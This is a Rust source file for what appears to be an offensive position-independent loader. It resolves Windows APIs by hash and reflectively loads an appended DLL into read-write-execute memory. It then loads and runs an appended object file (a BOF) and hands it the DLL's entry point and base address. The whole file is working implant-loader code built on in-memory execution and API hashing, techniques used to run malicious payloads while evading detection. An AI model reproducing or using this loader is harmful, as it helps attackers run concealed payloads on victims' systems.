#![no_std]
#![no_main]

#[panic_handler]
fn panic(_info: &PanicInfo) -> ! { loop {} }

use core::{ffi::c_void, mem, panic::PanicInfo, ptr::null_mut};
use crystal_sdk::{append_data, import};
use crystal_bindings::tcg::{DLLDATA, EntryPoint, IMPORTFUNCS, LoadDLL, ParseDLL, PicoCodeSize, PicoDataSize, PicoEntryPoint, PicoLoad, ProcessImports, SizeOfDLL, findFunctionByHash, findModuleByHash};
use winapi::{shared::{minwindef::{DWORD, FARPROC, HMODULE, LPVOID}, ntdef::LPCSTR}, um::winnt::{MEM_COMMIT, MEM_RESERVE, MEM_TOP_DOWN, PAGE_EXECUTE_READWRITE, PAGE_READWRITE}};


#[unsafe(no_mangle)]
pub extern "C" fn resolve(mod_hash: u32, func_hash: u32) -> FARPROC {
    unsafe {
        let h_module = findModuleByHash(mod_hash);
        findFunctionByHash(h_module, func_hash)
    }
}

append_data!(my_data, findAppendedDLL);
append_data!(my_bof, findAppendedPICO);

import!(KERNEL32!VirtualAlloc(lpAddress: LPVOID, dwSize: usize, flAllocationType: DWORD, flProtect: DWORD) -> LPVOID);
import!(LoadLibraryA(arg1: LPCSTR) -> HMODULE);
import!(GetProcAddress(arg1: HMODULE, arg2: LPCSTR) -> FARPROC);

pub type PicoMainFunc3 = unsafe extern "C" fn(loader: *const c_void, dll_entry: *const c_void, dll_base: *const c_void,);

fn run_via_free_coff(funcs: &mut IMPORTFUNCS, dll_entry: *const c_void, dll_base: *const c_void) {
    unsafe {
        let src = findAppendedPICO();
        let dst_data;
        let dst_code;

        /* allocate memory for our PICO */
        dst_data = VirtualAlloc( null_mut(), PicoDataSize(src as _) as _, MEM_RESERVE|MEM_COMMIT|MEM_TOP_DOWN, PAGE_READWRITE);
        dst_code = VirtualAlloc( null_mut(), PicoCodeSize(src as _) as _, MEM_RESERVE|MEM_COMMIT|MEM_TOP_DOWN, PAGE_EXECUTE_READWRITE);

        /* load our pico into our destination address, thanks! */
        PicoLoad(funcs, src as _, dst_code as _, dst_data as _);

        /* execute our pico */
        mem::transmute::<_, PicoMainFunc3>(PicoEntryPoint(src as _, dst_code as _))(go as _, dll_entry, dll_base);
    };

}

#[unsafe(no_mangle)]
extern "C" fn go() {
    unsafe { 
        let src = findAppendedDLL();    /* find our DLL appended to this PIC */
        let dst;
        let mut data: DLLDATA = mem::zeroed();

        /* setup our IMPORTFUNCS data structure */
        let mut funcs = IMPORTFUNCS { 
            LoadLibraryA: Some(LoadLibraryA_ptr()), 
            GetProcAddress: Some(GetProcAddress_ptr()) 
        };

        /* parse our DLL! */
        ParseDLL(src as _, &mut data);

        /* allocate memory for it! */
        dst = VirtualAlloc( null_mut(), SizeOfDLL(&mut data) as usize, MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE);

        /* load the damned thing */
        LoadDLL(&mut data, src as _, dst as _);

        /* process the imports */
        ProcessImports(&mut funcs, &mut data, dst as _);

        /* pass to our BOF */
        run_via_free_coff(&mut funcs, EntryPoint(&mut data, dst as _).unwrap_unchecked() as _, dst as _);
    };
}